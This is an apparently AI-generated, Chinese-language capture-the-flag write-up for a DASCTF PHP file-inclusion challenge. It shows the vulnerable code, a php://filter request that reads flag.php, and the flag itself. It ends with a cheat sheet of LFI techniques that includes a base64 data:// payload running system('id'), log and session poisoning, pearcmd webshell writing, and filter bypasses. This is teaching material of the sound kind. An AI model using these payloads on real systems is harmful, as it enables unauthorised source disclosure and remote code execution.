---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: '903d61f6-66f1-43e6-8d7e-33fd4b09e7e0'
  PropagateID: '903d61f6-66f1-43e6-8d7e-33fd4b09e7e0'
  ReservedCode1: '94c22c0f-acb6-4058-902f-da6c572cfe90'
  ReservedCode2: '94c22c0f-acb6-4058-902f-da6c572cfe90'
---

# DASCTF PHP文件包含 — php://filter 读取源码

## 题目信息

- **平台**: DASCTF
- **类型**: Web / 文件包含
- **Flag**: `CTF2{6862845c-89c8-405e-adb3-e7ff2184d818}`

## 源码分析

### index.php

```php
<?php
error_reporting(0);
$file = $_GET["file"];
if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){
    exit('hacker!');
}
if($file){
    include($file);
}else{
    echo '<a href="?file=flag.php">tips</a>';
}
?>
```

### flag.php

```php
<?php
echo "Can you find out the flag?";
//CTF2{6862845c-89c8-405e-adb3-e7ff2184d818}
```

## 漏洞分析

### 1. 文件包含漏洞

`include($file)` 直接包含用户传入的参数，没有任何路径限制或后缀固定。

### 2. 过滤规则

使用 `stristr()`（大小写不敏感）过滤了以下协议：

| 被过滤的协议 | 用途 |
|---------------|------|
| `php://input` | POST body 执行 PHP 代码 |
| `zip://` | 从 ZIP 压缩包中包含文件 |
| `phar://` | 从 PHAR 包中包含文件 |
| `data:` | data URI 直接执行代码（如 `data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+`） |

### 3. 未过滤的关键协议

**`php://filter`** 未被过滤！这是本题的突破口。

## 利用过程

### Step 1：识别文件包含

首页提示 `<a href="?file=flag.php">tips</a>`，直接访问 `?file=flag.php` 只看到 "Can you find out the flag?"（PHP 执行了代码，但 flag 在注释中不会显示）。

### Step 2：用 php://filter 读取源码

```
GET /?file=php://filter/convert.base64-encode/resource=flag.php
```

返回 base64 编码的 flag.php 源码：

```
PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL0NURjJ7Njg2Mjg0NWMtODljOC00MDVlLWFkYjMtZTdmZjIxODRkODE4fQo=
```

### Step 3：Base64 解码获取 Flag

解码后：

```php
<?php
echo "Can you find out the flag?";
//CTF2{6862845c-89c8-405e-adb3-e7ff2184d818}
```

Flag 在注释中：`CTF2{6862845c-89c8-405e-adb3-e7ff2184d818}`

## php://filter 知识点补充

### 原理

`php://filter` 是 PHP 的协议包装器，允许在读取文件时应用流过滤器。`convert.base64-encode` 过滤器会将文件内容编码为 base64，避免 PHP 引擎解析文件内容（这样注释中的 flag 也能被读取）。

### 语法

```
php://filter/[read|write]/[过滤器名]/resource=文件路径
```

常用写法：

```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
```

### 多过滤器链

可以串联多个过滤器：

```
php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php
php://filter/convert.iconv.UTF-8.UTF-16LE.UTF-8/resource=index.php
```

### 常见过滤器

| 过滤器 | 作用 |
|--------|------|
| `convert.base64-encode` | Base64 编码（最常用，读取源码） |
| `convert.base64-decode` | Base64 解码 |
| `convert.iconv.UTF-8.UTF-16` | 字符编码转换（绕 WAF） |
| `string.rot13` | ROT13 编码 |
| `string.toupper` | 转大写 |
| `string.tolower` | 转小写 |
| `string.strip_tags` | 去除 HTML/PHP 标签 |

### php://filter vs 直接 include 的区别

| 方式 | 行为 | 输出 |
|------|------|------|
| `include('flag.php')` | PHP 引擎解析执行 | 只看到 `echo` 输出的内容 |
| `include('php://filter/convert.base64-encode/resource=flag.php')` | 先 base64 编码再输出 | 看到完整源码的 base64 |

### 绕过技巧

1. **绕过关键字过滤**：如果 `php://filter` 被过滤，可用编码绕过：
   ```
   php://filter/convert.iconv.UTF-8.UTF-16/resource=flag.php
   ```

2. **绕过路径限制**：如果限制了后缀（如 `include($file . '.php')`），可用空字节截断（PHP < 5.3.4）或 `php://filter` 的 `resource` 指定完整路径。

3. **无回显时利用 pearcmd**：如果 `php://filter` 和其他协议都被过滤，检查 `/usr/local/lib/php/pearcmd.php` 是否存在（Docker 环境常见），通过它写入 Webshell。

## 通用 LFI 利用链速查

```
┌─────────────────────────────────────────────────────┐
│            PHP 文件包含利用 — 快速决策树             │
├─────────────────────────────────────────────────────┤
│                                                     │
│  能包含任意文件？                                    │
│    ├── php://filter 未过滤                           │
│    │     → 读取源码：php://filter/convert.base64-   │
│    │       encode/resource=目标文件                  │
│    │                                                 │
│    ├── php://input 未过滤                            │
│    │     → POST body 执行 PHP代码                    │
│    │       Content-Type: application/x-www-form-    │
│    │       urlencoded                                │
│    │                                                 │
│    ├── data:// 未过滤                                │
│    │     → data://text/plain;base64,PD9waHAg...     │
│    │       直接执行 base64 编码的 PHP 代码           │
│    │                                                 │
│    ├── 包含日志文件                                  │
│    │     → /var/log/apache2/access.log               │
│    │       /var/log/nginx/access.log                 │
│    │       写入 PHP 代码到 User-Agent 再包含        │
│    │                                                 │
│    ├── 包含 Session 文件                             │
│    │     → /tmp/sess_XXXX                            │
│    │       利用 session.upload_progress 写入代码    │
│    │                                                 │
│    ├── 包含 /proc/self/environ                       │
│    │     → User-Agent 写入 PHP 代码                  │
│    │                                                 │
│    ├── pearcmd.php (Docker)                          │
│    │     → /usr/local/lib/php/pearcmd.php            │
│    │       +&+register_argv=sess_XXX&write=&=id     │
│    │                                                 │
│    └── 临时文件竞争                                  │
│          → /tmp/phpXXXXXX (上传临时文件)              │
│            /tmp/sess_XXXX (session 文件)             │
│                                                     │
│  后缀被固定？                                        │
│    ├── %00 截断 (PHP < 5.3.4)                       │
│    ├── .（或 /.）路径截断 (旧版 PHP)                │
│    ├── php://filter （不受后缀固定影响）             │
│    └── zip:///phar:// （压缩包内文件不受后缀约束）   │
│                                                     │
└─────────────────────────────────────────────────────┘
```

> AI生成